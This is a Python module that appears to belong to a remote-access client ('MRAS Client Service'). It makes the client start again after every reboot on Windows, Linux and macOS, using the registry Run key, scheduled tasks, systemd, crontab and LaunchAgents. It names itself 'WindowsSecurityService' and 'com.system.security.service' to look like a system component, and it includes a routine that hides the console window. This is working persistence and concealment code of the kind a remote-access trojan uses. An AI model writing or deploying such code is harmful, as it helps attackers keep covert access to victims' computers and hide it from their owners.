"""
Cross-platform persistence — ensures the client auto-starts on system boot.

Windows  : Registry HKCU Run key (no admin needed) + Task Scheduler fallback
Linux    : systemd user service + @reboot crontab fallback
macOS    : LaunchAgent plist in ~/Library/LaunchAgents/
"""
from __future__ import annotations
import logging
import os
import sys
from pathlib import Path

log = logging.getLogger(__name__)

APP_NAME = "WindowsSecurityService"          # registry/service display name
APP_ID   = "com.system.security.service"     # reverse-domain ID for launchd


def install() -> bool:
    """Install persistence for the current platform. Returns True on success."""
    platform = sys.platform
    if platform == "win32":
        return _install_windows()
    elif platform == "linux":
        return _install_linux()
    elif platform == "darwin":
        return _install_macos()
    else:
        log.warning("Persistence not supported on platform: %s", platform)
        return False


def uninstall() -> bool:
    """Remove persistence for the current platform."""
    platform = sys.platform
    if platform == "win32":
        return _uninstall_windows()
    elif platform == "linux":
        return _uninstall_linux()
    elif platform == "darwin":
        return _uninstall_macos()
    return False


def is_installed() -> bool:
    platform = sys.platform
    if platform == "win32":
        return _check_windows()
    elif platform == "linux":
        return _check_linux()
    elif platform == "darwin":
        return _check_macos()
    return False


def _executable_path() -> str:
    """Return the path to run this process again after reboot."""
    if getattr(sys, "frozen", False):
        # PyInstaller binary
        return sys.executable
    # Running as a .py script
    return f'"{sys.executable}" "{Path(sys.argv[0]).resolve()}"'


# ── Windows ────────────────────────────────────────────────────────────────

def _install_windows() -> bool:
    installed = False

    # Method 1: Registry (no admin required)
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path,
                            0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, _executable_path())
        log.info("Persistence installed via Registry")
        installed = True
    except Exception as exc:
        log.warning("Registry persistence failed: %s", exc)

    # Method 2: Task Scheduler (survives log-off, runs at login)
    if not installed:
        installed = _schtasks_create()

    return installed


def _schtasks_create() -> bool:
    import subprocess
    exe = _executable_path()
    cmd = [
        "schtasks", "/create", "/tn", APP_NAME,
        "/tr", exe,
        "/sc", "ONLOGON",
        "/rl", "HIGHEST",
        "/f",          # overwrite if exists
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            log.info("Persistence installed via Task Scheduler")
            return True
        log.warning("schtasks failed: %s", result.stderr.strip())
    except Exception as exc:
        log.warning("Task Scheduler persistence failed: %s", exc)
    return False


def _uninstall_windows() -> bool:
    removed = False
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path,
                            0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, APP_NAME)
        removed = True
    except FileNotFoundError:
        pass
    except Exception as exc:
        log.warning("Registry removal failed: %s", exc)

    import subprocess
    try:
        subprocess.run(["schtasks", "/delete", "/tn", APP_NAME, "/f"],
                       capture_output=True, timeout=10)
    except Exception:
        pass

    return removed


def _check_windows() -> bool:
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.QueryValueEx(key, APP_NAME)
        return True
    except FileNotFoundError:
        return False
    except Exception:
        return False


# ── Linux ──────────────────────────────────────────────────────────────────

def _install_linux() -> bool:
    service_dir = Path.home() / ".config" / "systemd" / "user"
    service_file = service_dir / f"{APP_ID}.service"
    exe = _executable_path()

    service_content = f"""[Unit]
Description=MRAS Client Service
After=network.target

[Service]
Type=simple
ExecStart={exe}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""
    try:
        service_dir.mkdir(parents=True, exist_ok=True)
        service_file.write_text(service_content)
        import subprocess
        subprocess.run(["systemctl", "--user", "daemon-reload"], timeout=10)
        subprocess.run(["systemctl", "--user", "enable", "--now", f"{APP_ID}.service"], timeout=10)
        log.info("Persistence installed via systemd user service")
        return True
    except Exception as exc:
        log.warning("systemd persistence failed: %s — trying crontab", exc)
        return _crontab_install(exe)


def _crontab_install(exe: str) -> bool:
    import subprocess
    entry = f"@reboot {exe}"
    try:
        current = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout
        if entry not in current:
            new_cron = current.rstrip("\n") + f"\n{entry}\n"
            proc = subprocess.run(["crontab", "-"], input=new_cron, text=True,
                                  capture_output=True, timeout=10)
            if proc.returncode != 0:
                return False
        log.info("Persistence installed via crontab")
        return True
    except Exception as exc:
        log.warning("crontab persistence failed: %s", exc)
        return False


def _uninstall_linux() -> bool:
    service_file = Path.home() / ".config" / "systemd" / "user" / f"{APP_ID}.service"
    try:
        import subprocess
        subprocess.run(["systemctl", "--user", "disable", "--now", f"{APP_ID}.service"],
                       capture_output=True, timeout=10)
        if service_file.exists():
            service_file.unlink()
    except Exception:
        pass
    return True


def _check_linux() -> bool:
    service_file = Path.home() / ".config" / "systemd" / "user" / f"{APP_ID}.service"
    return service_file.exists()


# ── macOS ──────────────────────────────────────────────────────────────────

def _install_macos() -> bool:
    agents_dir = Path.home() / "Library" / "LaunchAgents"
    plist_file = agents_dir / f"{APP_ID}.plist"
    exe_parts = _executable_path().split()

    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{APP_ID}</string>
    <key>ProgramArguments</key>
    <array>
        {''.join(f'<string>{p}</string>' for p in exe_parts)}
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/{APP_ID}.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/{APP_ID}.err</string>
</dict>
</plist>
"""
    try:
        agents_dir.mkdir(parents=True, exist_ok=True)
        plist_file.write_text(plist_content)
        import subprocess
        subprocess.run(["launchctl", "load", "-w", str(plist_file)], timeout=10)
        log.info("Persistence installed via LaunchAgent")
        return True
    except Exception as exc:
        log.warning("LaunchAgent persistence failed: %s", exc)
        return False


def _uninstall_macos() -> bool:
    plist_file = Path.home() / "Library" / "LaunchAgents" / f"{APP_ID}.plist"
    try:
        import subprocess
        subprocess.run(["launchctl", "unload", str(plist_file)], capture_output=True, timeout=10)
        if plist_file.exists():
            plist_file.unlink()
    except Exception:
        pass
    return True


def _check_macos() -> bool:
    plist_file = Path.home() / "Library" / "LaunchAgents" / f"{APP_ID}.plist"
    return plist_file.exists()


# ── Windows console hiding ──────────────────────────────────────────────────

def hide_console() -> None:
    """Hide the console window on Windows (safe no-op on other platforms)."""
    if sys.platform != "win32":
        return
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)   # SW_HIDE = 0
    except Exception:
        pass
